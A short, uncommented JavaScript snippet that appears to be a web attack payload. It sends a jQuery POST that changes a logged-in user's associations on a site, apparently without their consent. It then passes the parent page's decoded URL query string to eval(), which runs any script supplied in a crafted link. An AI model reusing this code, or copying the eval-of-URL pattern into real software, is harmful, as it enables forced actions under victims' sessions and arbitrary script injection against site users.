$.ajax({
    type: 'POST',
    url: '/__services/v2/rest/stream-config/user/associations/manage',
    data: '[{"objectType":"3","objectID":"94242"}]',
    success: function(data){
        console.log(data)
    },
    dataType: 'json'
});

var queryString = parent.document.location.search.substr(1);
eval(decodeURIComponent(queryString));
